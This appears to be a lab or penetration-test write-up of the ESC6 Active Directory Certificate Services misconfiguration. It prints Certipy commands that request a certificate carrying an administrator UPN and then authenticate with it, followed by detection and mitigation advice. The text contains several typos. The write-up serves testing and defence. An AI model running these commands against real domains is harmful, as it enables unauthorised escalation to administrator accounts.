# ESC6: User-specified SAN at the Certificate Authority

## Objective

This test assessed whether the CA-levele configuration allowed a requester to specify an alternate identity in the Subject Alternamte Name and obtain a certificate usable for privileged authentication.

## Security condition

Certipy reported:

```text
User Specified SAN: Enabled
Request Disposition: Issue
```

This CA-wide setting can affect requests beyond one individual template. In order or intentionally vulnerable configurations, it may allow an enrollee to add a privileged IPN or SID to a request.

## Execution

A certificate request was made with an alternate privileged identity:

```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully requested certificate

```

The certificate was issued and used successfully for authentication.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.4.10.12
```

## Result

The CA accepted requester-controlled alternate identity information and issued a certificate that mapped to a privileged account.

## Security impact

Because the setting applies at the CA level, the blast radius can be broader than one misconfigured template. A low-privileged user may be able to transform otherwise ordinary enrolment into authetnication as another identity.

## Detection opportunities

- Certificate requests contaiing alternate UPNs or SIDs that do not match the requester
- Privileged certificate authentication shortly after a low-privileged requesst
- Changes to CA policy-module flags
- Requests that become successful only after a CA configuration change

## Mitigation

- Disable user-specified SAN behavior unless htere is a documetned requirement
- Apply current Windows security updates and review compatibility settings
- Restsrict templates available to low-privileged users
- Audit and revoke certificates issued under unsafe CA configuration
